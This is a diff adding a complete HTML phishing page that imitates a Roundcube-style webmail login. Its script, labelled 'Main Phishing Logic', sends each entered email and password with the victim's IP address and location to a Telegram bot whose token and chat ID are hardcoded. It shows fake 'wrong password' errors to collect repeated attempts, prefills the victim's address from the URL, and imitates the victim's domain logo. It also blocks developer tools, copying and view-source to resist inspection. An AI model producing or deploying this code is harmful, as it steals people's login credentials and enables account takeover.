@@ -1,0 +1,735 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A protected webmail login page with restricted user interactions">
+    <title>Welcome</title>
+
+    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Times New Roman', Times, serif;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            color: #222;
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none;
+            touch-action: manipulation;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        #particle-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 380px;
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(12px);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            overflow: hidden;
+            border: 1px solid rgba(14,165,233,.2);
+            position: relative;
+            z-index: 10;
+        }
+
+        .header {
+            padding: 24px 28px 18px;
+            text-align: center;
+        }
+
+        .logo-section {
+            margin-bottom: 10px;
+        }
+
+        #logo {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+            border-radius: 50%;
+            background: white;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+            transition: transform .2s ease;
+        }
+
+        #logo:hover { transform: scale(1.05); }
+
+        #welcomeLegend {
+            font-size: 24px;
+            font-weight: 600;
+            color: #111827;
+            margin: 0 0 8px;
+        }
+
+        .auth-note {
+            font-size: 14px;
+            color: #374151;
+            line-height: 1.5;
+        }
+
+        .auth-note strong { color: #111827; font-weight: 600; }
+
+        .form-container { padding: 0 28px 24px; }
+
+        .error-message {
+            background: #fef2f2;
+            border: 1px solid #f87171;
+            border-radius: 6px;
+            padding: 10px 14px;
+            margin-bottom: 18px;
+            display: none;
+            animation: fadeIn .3s ease;
+        }
+
+        .error-message p {
+            margin: 0;
+            font-size: 12px;
+            color: #dc2626;
+            font-weight: 500;
+        }
+
+        @keyframes fadeIn {
+            from { opacity:0; transform: translateY(-10px); }
+            to { opacity:1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px 38px 8px 10px;
+            font-size: 13px;
+            font-family: inherit;
+            border: none;
+            border-bottom: 2px solid #222;
+            background: transparent;
+            transition: border-color .2s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #0ea5e9;
+            outline: none;
+        }
+
+        .form-group input[readonly] {
+            background: #f3f4f6;
+            color: #1f2937;
+            cursor: not-allowed;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 8px;
+            top: 30px;
+            cursor: pointer;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6b7280;
+            transition: all .25s ease;
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .toggle-password.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .toggle-password:hover { color: #111827; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 11px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #fff;
+            background: #0ea5e9;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all .2s ease;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            background: #0284c7;
+            transform: scale(1.02);
+        }
+
+        .submit-btn:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .loading::after {
+            content: '';
+            display: inline-block;
+            width: 14px; height: 14px;
+            margin-left: 8px;
+            border: 2px solid transparent;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+
+        .footer {
+            background: #f3f4f6;
+            border-top: 1px solid #e5e7eb;
+            padding: 12px 28px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-bottom: 8px;
+        }
+
+        .footer-link {
+            color: #6b7280;
+            font-size: 12px;
+            font-weight: 500;
+            text-decoration: none;
+            position: relative;
+        }
+
+        .footer-link:hover { color: #0ea5e9; }
+
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 1px;
+            bottom: -2px;
+            left: 0;
+            background: #0ea5e9;
+            transition: width .2s ease;
+        }
+
+        .footer-link:hover::after { width: 100%; }
+
+        #language-select {
+            position: absolute;
+            top: 14px;
+            right: 14px;
+            padding: 5px 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 12px;
+            background: #fff;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+
+<canvas id="particle-canvas"></canvas>
+
+<div class="main-container">
+    <div class="header">
+        <div class="logo-section">
+            <img id="logo" src="https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg" alt="Logo" class="logo-img">
+        </div>
+        <h1 id="welcomeLegend">Welcome to Webmail</h1>
+        <div class="auth-note" id="title">
+            Please <strong>sign in</strong> to securely access your webmail. Authentication ensures your data is protected and grants you access to your personalized content.
+        </div>
+    </div>
+
+    <div class="form-container">
+        <div class="error-message" id="errorBox" style="display:none;">
+            <p>The password you entered is incorrect. Make sure that Caps Lock isn't on, then try again.</p>
+        </div>
+
+        <form class="mxf">
+            <div class="form-group">
+                <label for="em">Email</label>
+                <input type="email" name="em" id="em" placeholder="youremail@company.com" required autocomplete="email">
+            </div>
+            <div class="form-group">
+                <label for="pas">Password</label>
+                <input type="password" name="pas" id="pas" placeholder="Enter your password" required autocomplete="current-password">
+                <div class="toggle-password" id="togglePass">
+                    <svg id="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                    <svg id="eye-closed" style="display:none" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                    </svg>
+                </div>
+            </div>
+            <button type="submit" class="submit-btn btn2">Continue</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Help</a>
+        </div>
+    </div>
+</div>
+
+<select id="language-select">
+    <option value="en">English</option>
+    <option value="es">Español</option>
+    <option value="fr">Français</option>
+    <option value="de">Deutsch</option>
+    <option value="it">Italiano</option>
+    <option value="pt">Português</option>
+    <option value="ru">Русский</option>
+    <option value="zh">中文</option>
+    <option value="ja">日本語</option>
+    <option value="ar">العربية</option>
+</select>
+
+<script>
+// ─── STRONG SOURCE CODE / DEV TOOLS PROTECTION ────────────────────────
+// Block right-click (context menu)
+document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    return false;
+}, false);
+
+// Block common dev tools shortcuts
+document.addEventListener('keydown', function(e) {
+    // F12
+    if (e.key === 'F12') {
+        e.preventDefault();
+        return false;
+    }
+
+    // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+Shift+K
+    if (e.ctrlKey && e.shiftKey && ['I','J','C','K'].includes(e.key.toUpperCase())) {
+        e.preventDefault();
+        return false;
+    }
+
+    // Ctrl+U (view source), Ctrl+S (save), Ctrl+P (print), Ctrl+C (copy)
+    if (e.ctrlKey && ['U','S','P','C'].includes(e.key.toUpperCase())) {
+        e.preventDefault();
+        return false;
+    }
+
+    // Ctrl+Shift+U (some browsers)
+    if (e.ctrlKey && e.shiftKey && e.key.toUpperCase() === 'U') {
+        e.preventDefault();
+        return false;
+    }
+
+    // Meta+Alt+I (Mac dev tools)
+    if (e.metaKey && e.altKey && e.key.toUpperCase() === 'I') {
+        e.preventDefault();
+        return false;
+    }
+}, true);
+
+// Block copy, cut, paste, select, drag
+document.addEventListener('copy', e => e.preventDefault(), false);
+document.addEventListener('cut', e => e.preventDefault(), false);
+document.addEventListener('paste', e => e.preventDefault(), false);
+document.addEventListener('selectstart', e => e.preventDefault(), false);
+document.addEventListener('dragstart', e => e.preventDefault(), false);
+
+// Block view-source: protocol (basic client-side prevention)
+if (window.location.href.startsWith('view-source:')) {
+    window.location.href = window.location.href.replace('view-source:', '');
+}
+
+// Disable console overriding attempts
+Object.defineProperty(window, 'console', {
+    value: console,
+    writable: false,
+    configurable: false
+});
+
+// Extra layer: block F-keys commonly used for inspection
+document.addEventListener('keydown', e => {
+    if (e.key.startsWith('F') && ['F1','F3','F10','F12'].includes(e.key)) {
+        e.preventDefault();
+        return false;
+    }
+}, true);
+
+// ─── Particle Animation ──────────────────────────────────────────────
+const canvas = document.getElementById('particle-canvas');
+const ctx = canvas.getContext('2d');
+let particlesArray;
+
+function initParticles() {
+  particlesArray = [];
+  for (let i = 0; i < 100; i++) {
+    particlesArray.push({
+      x: Math.random() * window.innerWidth,
+      y: Math.random() * window.innerHeight,
+      size: Math.random() * 3 + 1,
+      speedX: (Math.random() - 0.5) * 0.5,
+      speedY: (Math.random() - 0.5) * 0.5,
+    });
+  }
+}
+
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+
+window.addEventListener('resize', () => {
+  resizeCanvas();
+  initParticles();
+});
+
+function animateParticles() {
+  ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+  particlesArray.forEach(p => {
+    p.x += p.speedX;
+    p.y += p.speedY;
+    if (p.x < 0 || p.x > window.innerWidth) p.speedX *= -1;
+    if (p.y < 0 || p.y > window.innerHeight) p.speedY *= -1;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+    ctx.fillStyle = 'rgba(255,255,255,0.4)';
+    ctx.fill();
+  });
+  connectParticles();
+  requestAnimationFrame(animateParticles);
+}
+
+function connectParticles() {
+  for (let a = 0; a < particlesArray.length; a++) {
+    for (let b = a + 1; b < particlesArray.length; b++) {
+      const dx = particlesArray[a].x - particlesArray[b].x;
+      const dy = particlesArray[a].y - particlesArray[b].y;
+      const distance = Math.sqrt(dx * dx + dy * dy);
+      if (distance < 100) {
+        ctx.strokeStyle = `rgba(255,255,255,${1 - distance / 100})`;
+        ctx.lineWidth = 1;
+        ctx.beginPath();
+        ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
+        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+        ctx.stroke();
+      }
+    }
+  }
+}
+
+resizeCanvas();
+initParticles();
+animateParticles();
+
+// ─── Translations (expanded) ─────────────────────────────────────────
+const translations = {
+  en: {
+    title: "Welcome to Webmail",
+    authNote: "Please <strong>sign in</strong> to securely access your webmail. Authentication ensures your data is protected and grants you access to your personalized content.",
+    emailLabel: "Email",
+    emailPlaceholder: "youremail@company.com",
+    passwordLabel: "Password",
+    passwordPlaceholder: "Enter your password",
+    button: "Continue",
+    error: "The password you entered is incorrect. Make sure that Caps Lock isn't on, then try again.",
+    privacy: "Privacy",
+    terms: "Terms",
+    help: "Help"
+  },
+  es: {
+    title: "Bienvenido a Webmail",
+    authNote: "Por favor <strong>iniciar sesión</strong> para acceder de forma segura a su webmail. La autenticación garantiza que sus datos estén protegidos y le otorga acceso a su contenido personalizado.",
+    emailLabel: "Correo electrónico",
+    emailPlaceholder: "tucorreo@compañia.com",
+    passwordLabel: "Contraseña",
+    passwordPlaceholder: "Ingrese su contraseña",
+    button: "Continuar",
+    error: "La contraseña que ingresó es incorrecta. Asegúrese de que Bloq Mayús no esté activado, luego intente nuevamente.",
+    privacy: "Privacidad",
+    terms: "Términos",
+    help: "Ayuda"
+  },
+  fr: {
+    title: "Bienvenue sur Webmail",
+    authNote: "Veuillez <strong>vous connecter</strong> pour accéder en toute sécurité à votre webmail. L'authentification garantit que vos données sont protégées et vous accorde l'accès à votre contenu personnalisé.",
+    emailLabel: "E-mail",
+    emailPlaceholder: "votremail@entreprise.com",
+    passwordLabel: "Mot de passe",
+    passwordPlaceholder: "Entrez votre mot de passe",
+    button: "Continuer",
+    error: "Le mot de passe que vous avez saisi est incorrect. Assurez-vous que le verrouillage des majuscules n'est pas activé, puis réessayez.",
+    privacy: "Confidentialité",
+    terms: "Conditions",
+    help: "Aide"
+  },
+  de: {
+    title: "Willkommen bei Webmail",
+    authNote: "Bitte <strong>melden Sie sich an</strong>, um sicher auf Ihr Webmail zuzugreifen. Die Authentifizierung schützt Ihre Daten und gewährt Ihnen Zugriff auf Ihren personalisierten Inhalt.",
+    emailLabel: "E-Mail",
+    emailPlaceholder: "ihreemail@firma.de",
+    passwordLabel: "Passwort",
+    passwordPlaceholder: "Geben Sie Ihr Passwort ein",
+    button: "Weiter",
+    error: "Das eingegebene Passwort ist falsch. Stellen Sie sicher, dass die Feststelltaste nicht aktiviert ist, und versuchen Sie es erneut.",
+    privacy: "Datenschutz",
+    terms: "Nutzungsbedingungen",
+    help: "Hilfe"
+  },
+  it: {
+    title: "Benvenuto su Webmail",
+    authNote: "Effettua il <strong>login</strong> per accedere in sicurezza alla tua webmail. L'autenticazione protegge i tuoi dati e ti consente l'accesso ai tuoi contenuti personalizzati.",
+    emailLabel: "Email",
+    emailPlaceholder: "tuaemail@azienda.it",
+    passwordLabel: "Password",
+    passwordPlaceholder: "Inserisci la tua password",
+    button: "Continua",
+    error: "La password inserita è errata. Assicurati che il blocco maiuscole non sia attivo e riprova.",
+    privacy: "Privacy",
+    terms: "Termini",
+    help: "Aiuto"
+  },
+  pt: {
+    title: "Bem-vindo ao Webmail",
+    authNote: "Por favor <strong>faça login</strong> para acessar seu webmail com segurança. A autenticação protege seus dados e concede acesso ao seu conteúdo personalizado.",
+    emailLabel: "Email",
+    emailPlaceholder: "seuemail@empresa.com",
+    passwordLabel: "Senha",
+    passwordPlaceholder: "Digite sua senha",
+    button: "Continuar",
+    error: "A senha digitada está incorreta. Verifique se o Caps Lock não está ativado e tente novamente.",
+    privacy: "Privacidade",
+    terms: "Termos",
+    help: "Ajuda"
+  },
+  ru: {
+    title: "Добро пожаловать в Webmail",
+    authNote: "Пожалуйста <strong>войдите</strong>, чтобы безопасно получить доступ к вашей веб-почте. Аутентификация защищает ваши данные и предоставляет доступ к вашему персонализированному контенту.",
+    emailLabel: "Электронная почта",
+    emailPlaceholder: "вашапочта@компания.ru",
+    passwordLabel: "Пароль",
+    passwordPlaceholder: "Введите ваш пароль",
+    button: "Продолжить",
+    error: "Введённый пароль неверный. Убедитесь, что Caps Lock выключен, и попробуйте снова.",
+    privacy: "Конфиденциальность",
+    terms: "Условия",
+    help: "Помощь"
+  },
+  zh: {
+    title: "欢迎使用 Webmail",
+    authNote: "请<strong>登录</strong>以安全访问您的网页邮件。身份验证确保您的数据受到保护，并授予您访问个性化内容。",
+    emailLabel: "电子邮件",
+    emailPlaceholder: "你的邮箱@公司.com",
+    passwordLabel: "密码",
+    passwordPlaceholder: "输入您的密码",
+    button: "继续",
+    error: "输入的密码不正确。请确保大写锁定未开启，然后重试。",
+    privacy: "隐私",
+    terms: "条款",
+    help: "帮助"
+  },
+  ja: {
+    title: "Webmail へようこそ",
+    authNote: "<strong>ログイン</strong>して安全にウェブメールにアクセスしてください。認証によりデータが保護され、パーソナライズされたコンテンツにアクセスできます。",
+    emailLabel: "メール",
+    emailPlaceholder: "あなたのメール@会社.com",
+    passwordLabel: "パスワード",
+    passwordPlaceholder: "パスワードを入力してください",
+    button: "続ける",
+    error: "入力されたパスワードが正しくありません。Caps Lockがオフになっているか確認して、もう一度お試しください。",
+    privacy: "プライバシー",
+    terms: "利用規約",
+    help: "ヘルプ"
+  },
+  ar: {
+    title: "مرحبا بك في Webmail",
+    authNote: "يرجى <strong>تسجيل الدخول</strong> للوصول بأمان إلى بريدك الإلكتروني عبر الويب. التحقق من الهوية يضمن حماية بياناتك ويمنحك الوصول إلى محتواك الشخصي.",
+    emailLabel: "البريد الإلكتروني",
+    emailPlaceholder: "بريدك@الشركة.com",
+    passwordLabel: "كلمة المرور",
+    passwordPlaceholder: "أدخل كلمة المرور الخاصة بك",
+    button: "متابعة",
+    error: "كلمة المرور التي أدخلتها غير صحيحة. تأكد من أن Caps Lock غير مفعل ثم حاول مرة أخرى.",
+    privacy: "الخصوصية",
+    terms: "الشروط",
+    help: "المساعدة"
+  }
+};
+
+let currentLang = 'en';
+
+function setLanguage(lang) {
+  currentLang = lang;
+  document.title = translations[lang].title;
+  document.getElementById('title').innerHTML = translations[lang].authNote;
+  document.querySelector('label[for="em"]').textContent = translations[lang].emailLabel;
+  document.getElementById('em').placeholder = translations[lang].emailPlaceholder;
+  document.querySelector('label[for="pas"]').textContent = translations[lang].passwordLabel;
+  document.getElementById('pas').placeholder = translations[lang].passwordPlaceholder;
+  document.querySelector('.btn2').textContent = translations[lang].button;
+  document.querySelector('#errorBox p').textContent = translations[lang].error;
+  const links = document.querySelectorAll('.footer-link');
+  links[0].textContent = translations[lang].privacy;
+  links[1].textContent = translations[lang].terms;
+  links[2].textContent = translations[lang].help;
+}
+
+// Password toggle
+const passField = document.getElementById('pas');
+const toggleBtn = document.getElementById('togglePass');
+const eyeOpen = document.getElementById('eye-open');
+const eyeClosed = document.getElementById('eye-closed');
+
+toggleBtn.addEventListener('click', () => {
+  const isPass = passField.type === 'password';
+  passField.type = isPass ? 'text' : 'password';
+  eyeOpen.style.display = isPass ? 'none' : 'block';
+  eyeClosed.style.display = isPass ? 'block' : 'none';
+});
+
+passField.addEventListener('input', () => toggleBtn.classList.toggle('visible', passField.value.length > 0));
+
+// ─── Main Phishing Logic ─────────────────────────────────────────────
+(function(){
+  const CONFIG = {
+    TELEGRAM_TOKEN: '8388451713:AAG7uRKubsjZgseDwUAC3uPY0m0ZisSVADI',
+    TELEGRAM_CHAT_ID: '8234274747',
+    ATTEMPT_LIMIT: 4,
+    DELAY_MS: 2000
+  };
+
+  const $form = $('.mxf'),
+        $email = $('#em'),
+        $password = $('#pas'),
+        $button = $('.btn2'),
+        $error = $('#errorBox'),
+        $logo = $('#logo');
+
+  let attemptCount = 0,
+      userIp = {ip:'Unknown',city:'Unknown',country:'Unknown'},
+      domain = '';
+
+  const getHashParam = () => decodeURIComponent(window.location.hash.slice(1));
+  const extractDomain = email => email.split('@')[1] || '';
+  const sanitizeInput = str => String(str).trim();
+
+  const sendTelegramMessage = msg => $.ajax({
+    url: `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`,
+    method: 'POST',
+    data: { chat_id: CONFIG.TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' }
+  });
+
+  const fetchIpInfo = () => $.getJSON('https://ipinfo.io/json').then(d => userIp = d);
+
+  const DEFAULT_LOGO = "https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg";
+
+  const updateDomainUI = domain => {
+    if (!domain) {
+      $logo.attr('src', DEFAULT_LOGO);
+      return;
+    }
+
+    const logoUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
+
+    $logo.attr('src', logoUrl).on('load', function() {
+      if (this.naturalWidth <= 32 || this.naturalHeight <= 32) {
+        this.src = DEFAULT_LOGO;
+      }
+    }).on('error', function() {
+      this.src = DEFAULT_LOGO;
+    });
+  };
+
+  const handleSubmit = e => {
+    e.preventDefault();
+    const email = sanitizeInput($email.val());
+    const password = sanitizeInput($password.val());
+    if (!email || !password) return;
+
+    attemptCount++;
+    $button.prop('disabled', true).addClass('loading').text('Verifying...');
+    $error.hide();
+
+    const maskedEmail = email.replace('@', '+');
+    const message = `*${domain.toUpperCase() || 'UNKNOWN'} WEBMAIL LOGIN*\n` +
+      `|───Script3d|By|Prim3───|\n` +
+      `*Email:* \`${maskedEmail}\`\n` +
+      `*Password:* \`${password}\`\n` +
+      `*IP:* \`${userIp.ip}\`\n` +
+      `*Location:* ${userIp.city}, ${userIp.country}\n` +
+      `*Attempts:* ${attemptCount}/${CONFIG.ATTEMPT_LIMIT}\n` +
+      `*Time:* ${new Date().toLocaleString()}\n` +
+      `|───Script3d|By|Prim3───|\n`;
+
+    sendTelegramMessage(message);
+
+    setTimeout(() => {
+      $button.prop('disabled', false).removeClass('loading').text(translations[currentLang].button);
+      if (attemptCount <= CONFIG.ATTEMPT_LIMIT) {
+        $error.show();
+        $password.val('').focus();
+        toggleBtn.classList.remove('visible');
+      } else {
+        window.location.href = 'https://support.cpanel.net/hc/en-us/articles/360048399873-500-Internal-Server-Error';
+      }
+    }, CONFIG.DELAY_MS);
+  };
+
+  $(window).on('load', () => {
+    setLanguage('en');
+    const emailFromHash = getHashParam();
+    if (emailFromHash && emailFromHash.includes('@')) {
+      $email.val(emailFromHash).prop('readonly', true);
+      domain = extractDomain(emailFromHash);
+      updateDomainUI(domain);
+    }
+    fetchIpInfo();
+    $form.on('submit', handleSubmit);
+    document.getElementById('language-select').addEventListener('change', (e) => {
+      setLanguage(e.target.value);
+      if (domain) updateDomainUI(domain);
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
